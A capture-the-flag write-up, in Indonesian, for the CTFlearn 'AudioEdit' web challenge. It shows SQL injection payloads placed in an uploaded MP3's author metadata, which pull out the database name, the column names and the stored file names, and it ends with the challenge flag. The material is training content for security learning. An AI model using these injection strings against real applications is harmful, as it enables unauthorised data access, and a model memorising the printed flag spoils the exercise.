# AudioEdit (160 Points)
I made this cool site for editing audio files. Can you exploit it? http://web.ctflearn.com/audioedit/
# Solved
Pada kasus ini saya pernah melihat sebuah Write-ups dari events <b>ABCTF</b>. Mungkin challenge ini dibuat untuk dipelajar-ulang. Dan target kita adalah mencapai URL
```
https://web.ctflearn.com/audioedit/edit.php?file=supersecretflagf1le.mp3
```
Disini kita diberikan sebuah Halaman upload https://web.ctflearn.com/audioedit/upload.php sebuah <b>mp3</b>
```
Edit Audio
Author: SoundJay.com Sound Effect
Title: Unknown Title
```
Disini setelah saya analisa, kita bisa mengatur dari <b>Author</b> dan <b>Title</b>. Dan tentu kemungkinan SQL Query nya adalah
```sql
INSERT INTO audio SET VALUES('namafile', 'author', 'title')
```
Kemudian untuk mendapatkan Database nya kita ubah pada <b>Contributing Artist</b>
```sql
AUTHOR', (SELECT database())) -- -; 
```
```
Title: audioedit
```
Kita mengetahui bahwa database dan table yang dipakai adalah <b>audioedit</b>, kemudian mari kita mencari kolomnya
```sql
AUTHOR', (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name='audioedit')) -- -; 
```
```
Title: id,file,author,title
```
Kemudian last step yaitu mendapatkan file yang ada di table tersebut
```sql
AUTHOR', (SELECT GROUP_CONCAT(file) FROM audioedit as tmp)) -- -; 
```
```
Title: supersecretflagf1le.mp3,dae94d2ae419b398c977f27f4190680715ae10c3.mp3,e5ab2208f0fc1076980ecb69398b93a5e55fd247.mp3,dfc9c5bc70f2f8
```
Kemudian akses https://web.ctflearn.com/audioedit/edit.php?file=supersecretflagf1le.mp3, Ubah <b>Visualisation</b> nya menjadi <b>Sonogram</b><br>
Flag : <b>ABCTF{m3t4_inj3cti00n}</b>